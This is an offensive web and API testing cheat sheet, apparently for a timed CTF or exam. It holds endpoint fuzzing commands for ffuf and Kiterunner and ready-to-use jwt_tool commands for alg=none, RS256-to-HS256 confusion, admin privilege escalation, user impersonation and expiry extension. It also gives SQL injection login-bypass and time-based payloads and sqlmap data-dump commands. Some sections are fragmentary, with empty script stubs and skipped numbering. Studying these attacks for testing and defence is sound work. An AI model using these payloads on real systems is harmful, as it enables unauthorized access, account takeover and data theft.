### 2. Endpoint Fuzzing (Kiterunner & ffuf) ⏱️ 15 min

#### 2.1. Kiterunner (Contextual verb discovery)

```bash
# Quick scan
kr scan http://$TARGET_HOST -w ~/Tools/SecLists/Discovery/Web-Content/api/api-endpoints.txt

# With precompiled file (faster)
kr scan http://$TARGET_HOST -A=apiroutes-240916
```

#### 2.2. ffuf (Classic fuzzing)

```bash
ffuf -u http://$TARGET_HOST/FUZZ \
  -w ~/Tools/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,202,301,302,401,403 -c -of json -o /tmp/endpoints.json
```

**Useful Parameters:**
- `-mc` : Match codes (which to show)
- `-fc` : Filter codes (which to hide)
- `-c` : Colors
- `-of json` : Output JSON format
- `-ac` : Auto-calibrate (ignore false positives)

## 🔐 PHASE 3A: Authentication & JWT (0:45 - 1:45)

### 5. 🛡️ JSON Web Tokens (JWT) Attacks ⏱️ 60 min

*🔗 PayloadsAllTheThings: [JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)*

#### 5.1. Quick Installation and Usage of jwt_tool ⏱️ 3 min

**Installation:**
```bash
pip install jwt-tool
# Or from repo
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip install -r requirements.txt
```

**Base Syntax:**
```bash
jwt_tool <TOKEN> [OPTIONS]
jwt_tool -t <TOKEN> -M <MODE> -S <SECRET/KEY>
```

**Main Flags:**
- `-t <TOKEN>`: Specify token (omit if passing as argument)
- `-M <MODE>`: Attack mode (alg, hs256, rs256, kty, none, etc.)
- `-b <WORDLIST>`: Brute force with dictionary
- `-S <SECRET>`: Secret for signing (HS256)
- `-p <PAYLOAD>`: Modified JSON payload (claims)
- `-o <OUTPUT>`: Save token to file
- `-x <EXTRA>`: Extra parameters (headers, custom claims)

#### 5.2. Signature Bypass Attacks ⏱️ 20 min

##### 5.2.1. "alg=none" Attack (None Algorithm)

**Description:** Server validates signature but accepts `alg=none`. Modify header and payload without signing.

**JWT Structure:**
- Header: `{"alg":"none","typ":"JWT"}`
- Payload: `{"user":"admin","role":"admin"}`
- Signature: empty (just the `.`)
- Result: `base64(header).base64(payload).`

##### 5.2.2. Algorithm Confusion (RS256 → HS256)

**Description:** RS256 uses public/private keys. If server validates using public key as if it were secret (HS256), we can sign with the public key.

**Steps:**

1. Extract server's public key:
```bash
curl https://$TARGET_HOST/.well-known/jwks.json | jq .keys[0] > public_key.json
```

2. Convert to PEM format:
```bash
jwt_tool -t <TOKEN> -M kty -K public_key.json
```

3. Create modified payload and sign with HS256:
```bash
jwt_tool -t <TOKEN> -M hs256 -S "$(cat public_key.pem)"
```

4. At the prompt, modify claims:
```json
{"user":"admin","role":"admin","sub":"1"}
```

5. Token signed with HMAC-SHA256 using public key: ready to use

**One-liner:**
```bash
JWT_TOKEN="<original_token>"
jwt_tool -t "$JWT_TOKEN" -M hs256 -S "$(curl https://$TARGET_HOST/.well-known/jwks.json | jq -r .keys[0].n)"
```

#### 5.3. Claim Injection & Privilege Escalation ⏱️ 15 min

##### 5.3.1. Role Elevation (role, admin, is_admin)

**Description:** Modify permission-related claims within payload.

**Base Command:**
```bash
jwt_tool -t <TOKEN> -M none -p '{"role":"admin","is_admin":true,"user":"attacker"}'
```

**Common payloads to inject:**

```json
{
  "role": "admin",
  "is_admin": true,
  "permissions": ["read", "write", "delete", "admin"],
  "privilege_level": 99,
  "scope": "admin",
  "access_level": "superuser"
}
```

**Complete Process:**

1. Decode original token:
```bash
echo "<TOKEN>" | cut -d'.' -f2 | base64 -d | jq .
```

2. Save payload to file:
```bash
cat > admin_payload.json << 'EOF'
{
  "user": "attacker",
  "role": "admin",
  "is_admin": true,
  "permissions": ["read", "write", "delete", "admin"],
  "privilege_level": 99
}
EOF
```

3. Sign with `none`:
```bash
jwt_tool -t <TOKEN> -M none -p @admin_payload.json
```

4. Use token in headers:
```bash
curl -H "Authorization: Bearer <NEW_TOKEN>" https://$TARGET_HOST/api/admin/users
```

##### 5.3.2. User Impersonation (user_id, username, sub)

**Description:** Change user identity within token.

**Impersonation Payloads:**

```json
{
  "user_id": "1",
  "username": "admin",
  "sub": "admin_user_id",
  "email": "admin@target.com",
  "user": "admin"
}
```

**Command:**
```bash
jwt_tool -t <TOKEN> -M none -p '{"user_id":"1","username":"admin","sub":"1","email":"admin@target.com"}'
```

**Use Cases:**

- Change `user_id` to access other profiles:
```bash
jwt_tool -t <TOKEN> -M none -p '{"user_id":"2","username":"other_user"}'
```

- Impersonate specific administrator:
```bash
jwt_tool -t <TOKEN> -M none -p '{"sub":"admin_uuid","username":"administrator","role":"admin"}'
```

**Description:** Test thousands of secrets against token to find the key.

#### 5.5. Expiration (exp) Manipulation ⏱️ 10 min

##### 5.5.1. Extend Expiration Date

**Calculate future timestamp:**
```bash
# 30 days ahead
future_exp=$(($(date +%s) + 2592000))
echo $future_exp

# Or hardcoded (2026-12-31)
future_exp=1825097999
```

**One-liner:**
```bash
FUTURE_EXP=$(($(date +%s) + 2592000))
jwt_tool -t <TOKEN> -M none -p '{"user":"admin","role":"admin","exp":'$FUTURE_EXP'}'
```

**Bash Script:**
```bash
#!/bin/bash
# jwt_extend_token.sh
TOKEN="$1"
FUTURE_EXP=$(($(date +%s) + 31536000))  # 1 year

NEW_TOKEN=$(jwt_tool -t "$TOKEN" -M none -p '{"exp":'$FUTURE_EXP'}')
echo "$NEW_TOKEN"
```

**Payload Without Time Restrictions:**

```bash
#!/bin/bash
TOKEN="$1"
```

```bash
#!/bin/bash
```


### 10. 🗄️ SQL Injection (SQLi) ⏱️ 15 min

*🔗 PayloadsAllTheThings: [SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)*

#### 10.1. Authentication Bypass (Login)

```json
{"username": "admin' OR '1'='1", "password": "x"}
{"username": "admin' --", "password": "x"}
{"username": "admin'/*", "password": "x"}
```

#### 10.2. Time-Based (PostgreSQL / MySQL / MS SQL)

```sql
admin'; pg_sleep(5)--
admin' AND SLEEP(5)--
admin'; WAITFOR DELAY '0:0:5'--
```

#### 10.3. Bypass in JSON (changing data type)

If expects `{"id": 123}`, try:
```json
{"id": "123 OR 1=1"}
{"id": [123]}
```

#### 10.4. sqlmap Blind Injection (JSON Payloads)

Intercept request in Burp, save as `/tmp/request.txt`:

```bash
sqlmap -r /tmp/request.txt --batch --level=3 --risk=2 --dbs

# If injection detected, dump data
sqlmap -r /tmp/request.txt --batch --dump -T flags_table
```
